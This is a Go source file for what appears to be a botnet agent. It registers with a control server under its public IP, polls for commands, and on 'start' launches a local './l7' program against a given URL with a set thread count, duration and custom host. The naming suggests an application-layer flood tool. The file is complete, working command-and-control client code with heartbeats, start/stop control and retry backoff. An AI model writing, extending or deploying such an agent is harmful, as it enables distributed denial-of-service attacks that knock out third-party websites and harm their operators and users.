package main

import (
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"
)

type Command struct {
	Action     string `json:"action"`      // "start", "stop", "none"
	URL        string `json:"url"`
	Threads    int    `json:"threads"`
	Timer      int    `json:"timer"`
	CustomHost string `json:"custom_host"`
}

var (
	mu             sync.Mutex
	currentCmd     *exec.Cmd
	currentCancel  context.CancelFunc
	status         = "Ready"
)

func reportStatus(controlURL, agentID string) {
	mu.Lock()
	payload := map[string]string{
		"agentID": agentID,
		"status":  status,
	}
	mu.Unlock()

	data, err := json.Marshal(payload)
	if err != nil {
		fmt.Printf("[AGENT] Failed to marshal status payload: %v\n", err)
		return
	}

	resp, err := http.Post(controlURL+"/agent-status", "application/json", bytes.NewBuffer(data))
	if err != nil {
		fmt.Printf("[AGENT] Failed to POST status: %v\n", err)
		return
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
}

func executeL7(controlURL, agentID, url string, threads, timer int, customHost string) {
	mu.Lock()
	// If there is already a running command, cancel it first
	if currentCancel != nil {
		currentCancel()
		currentCancel = nil
		currentCmd = nil
	}
	status = "Sending"
	mu.Unlock()

	reportStatus(controlURL, agentID)

	// Build context with timeout
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timer)*time.Second)

	args := []string{url, fmt.Sprintf("%d", threads), fmt.Sprintf("%d", timer)}
	if customHost != "" {
		args = append(args, customHost)
	}

	cmd := exec.CommandContext(ctx, "./l7", args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Start(); err != nil {
		fmt.Printf("[AGENT] Failed to start L7: %v\n", err)
		cancel()

		mu.Lock()
		status = "Error"
		mu.Unlock()
		reportStatus(controlURL, agentID)
		return
	}

	mu.Lock()
	currentCmd = cmd
	currentCancel = cancel
	mu.Unlock()

	// Wait for either the context to expire or for the process to finish early (e.g. killed by stop)
	go func() {
		err := cmd.Wait()
		mu.Lock()
		defer mu.Unlock()

		// If the context expired, its CancelFunc has already killed the process.
		if ctx.Err() == context.DeadlineExceeded {
			// Normal “timer elapsed” case
			status = "Ready"
		} else if err != nil {
			fmt.Printf("[AGENT] L7 exited with error: %v\n", err)
			status = "Error"
		} else {
			// Process finished on its own (maybe threads finished early?)
			status = "Ready"
		}

		// Clear references
		currentCmd = nil
		currentCancel = nil

		reportStatus(controlURL, agentID)
	}()
}

func pollControlServer(controlURL, agentID string) {
	backoff := 1 * time.Second

	for {
		pollURL := fmt.Sprintf("%s/poll-agent?agentID=%s", controlURL, agentID)
		client := http.Client{
			Timeout: 5 * time.Second,
		}

		resp, err := client.Get(pollURL)
		if err != nil {
			fmt.Printf("[AGENT] Error polling control server: %v (retrying in %v)\n", err, backoff)
			time.Sleep(backoff)
			// Exponential backoff up to a ceiling (e.g. 30s)
			if backoff < 30*time.Second {
				backoff *= 2
			}
			continue
		}

		bodyBytes, readErr := io.ReadAll(resp.Body)
		resp.Body.Close()
		if readErr != nil {
			fmt.Printf("[AGENT] Error reading poll response: %v\n", readErr)
			time.Sleep(backoff)
			continue
		}

		// Reset backoff on a successful contact
		backoff = 1 * time.Second

		var cmd Command
		if err := json.Unmarshal(bodyBytes, &cmd); err != nil {
			fmt.Printf("[AGENT] Invalid JSON from control server: %v\n", err)
			time.Sleep(2 * time.Second)
			continue
		}

		switch cmd.Action {
		case "start":
			fmt.Printf("[AGENT] Received START: %+v\n", cmd)
			go executeL7(controlURL, agentID, cmd.URL, cmd.Threads, cmd.Timer, cmd.CustomHost)

		case "stop":
			fmt.Printf("[AGENT] Received STOP\n")
			mu.Lock()
			if currentCancel != nil {
				currentCancel()
				currentCancel = nil
				currentCmd = nil
			}
			status = "Ready"
			mu.Unlock()
			reportStatus(controlURL, agentID)

		case "none":
			// No new command → send a heartbeat
			reportStatus(controlURL, agentID)

		default:
			// Unknown action → ignore
			fmt.Printf("[AGENT] Unknown action: %q. Ignoring.\n", cmd.Action)
			reportStatus(controlURL, agentID)
		}
	}
}

func getPublicIP() (string, error) {
	const ipService = "https://api.ipify.org?format=text"
	client := http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(ipService)
	if err != nil {
		return "", fmt.Errorf("failed to fetch public IP: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("failed to read IP response: %w", err)
	}

	ip := strings.TrimSpace(string(body))
	if ip == "" {
		return "", fmt.Errorf("empty IP returned from %s", ipService)
	}
	return ip, nil
}

func main() {
	// 1. Declare the -server flag
	defaultServer := "http://localhost:8080"
	serverFlag := flag.String("server", defaultServer, "Control server URL (e.g. https://example.com)")
	flag.Parse()

	// 2. Get public IP → agentID
	ip, err := getPublicIP()
	if err != nil {
		fmt.Printf("[AGENT] Could not determine public IP: %v\n", err)
		os.Exit(1)
	}
	agentID := ip

	// 3. Use the value of -server
	controlServerURL := *serverFlag
	fmt.Printf("[AGENT] %s starting; polling %s\n", agentID, controlServerURL)

	// 4. Report initial “Ready” status
	reportStatus(controlServerURL, agentID)

	// 5. Begin polling loop
	pollControlServer(controlServerURL, agentID)
}
